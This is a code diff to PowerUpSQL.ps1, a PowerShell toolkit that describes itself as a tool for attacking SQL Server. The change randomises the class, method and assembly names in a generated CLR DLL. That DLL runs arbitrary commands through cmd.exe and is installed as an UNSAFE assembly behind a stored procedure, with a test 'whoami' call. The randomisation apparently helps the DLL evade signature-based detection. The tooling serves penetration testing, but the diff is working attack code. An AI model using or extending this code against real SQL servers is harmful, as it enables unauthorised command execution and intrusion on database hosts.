@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.1.92
+        Version: 1.1.93
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -10809,7 +10809,17 @@ function Create-SQLFileCLRDll
 
         # Status the user
         Write-Verbose "Target C#  File: $SRCPath" 
-        Write-Verbose "Target DLL File: $DllPath" 
+        Write-Verbose "Target DLL File: $DllPath"
+        
+        # Get random length
+        $ClassNameLength = (5..10 | Get-Random -count 1 )
+        $MethodNameLength = (5..10 | Get-Random -count 1 )
+        $AssemblyLength = (5..10 | Get-Random -count 1 )
+
+        # Create random class name                                        
+        $ClassName = (-join ((65..90) + (97..122) | Get-Random -Count $ClassNameLength | % {[char]$_}))
+        $MethodName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
+        $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
 
         if (-not $SourceDllPath){
             # Create c# teamplate that will run any provided command
@@ -10823,10 +10833,10 @@ function Create-SQLFileCLRDll
             using System.IO;
             using System.Diagnostics;
             using System.Text;
-            public partial class StoredProcedures
+            public partial class $ClassName
             {
             [Microsoft.SqlServer.Server.SqlProcedure]
-            public static void $ProcedureName (SqlString execCommand)
+            public static void $MethodName (SqlString execCommand)
             {
             Process proc = new Process();
             proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
@@ -10885,9 +10895,10 @@ function Create-SQLFileCLRDll
         if (-not $SourceDllPath){
 
             # write from default file
+            $ProcedureNameSp = "sp_$ProcedureName"
             $stringBuilder = New-Object -Type System.Text.StringBuilder
             $stringBuilder.Append("CREATE ASSEMBLY [") > $null
-            $stringBuilder.Append($ProcedureName) > $null
+            $stringBuilder.Append($AssemblyName) > $null
             $stringBuilder.Append("] AUTHORIZATION [dbo] FROM `n0x") > $null
             $assemblyFile = resolve-path $DllPath
             $fileStream = [IO.File]::OpenRead($assemblyFile)
@@ -10896,9 +10907,9 @@ function Create-SQLFileCLRDll
             }
             $null = $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
             $null = $stringBuilder.AppendLine("GO")
-            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
+            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureNameSp] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$AssemblyName].[$ClassName].[$MethodName];")
             $null = $stringBuilder.AppendLine("GO")
-            $null = $stringBuilder.AppendLine("EXEC[dbo].[$ProcedureName] 'whoami'")        
+            $null = $stringBuilder.AppendLine("EXEC[dbo].[$ProcedureNameSp] 'whoami'")        
             $null = $stringBuilder.AppendLine("GO")
             $MySQLCommand = $stringBuilder.ToString() -join ""
             $fileStream.Close()
